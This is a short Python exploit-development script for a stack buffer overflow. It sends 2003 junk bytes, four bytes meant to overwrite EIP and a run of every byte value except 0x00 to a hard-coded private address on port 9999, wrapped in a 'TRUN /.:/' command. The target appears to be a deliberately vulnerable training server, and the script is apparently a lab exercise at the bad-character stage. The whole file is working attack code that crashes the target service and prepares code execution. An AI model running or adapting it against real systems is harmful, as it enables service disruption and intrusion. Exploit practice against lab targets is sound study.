#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

bad_chars = [0x00]
chars = b""
for i in range(0x00,0xFF+1):
    if i not in bad_chars:
        chars += bytes([i])

buff  = b""         # empty byte var
buff += b"A"*offset # junk
buff += b"B"*4      # EIP
buff += b"" + chars # test for chars

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b"TRUN /.:/%s" % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()
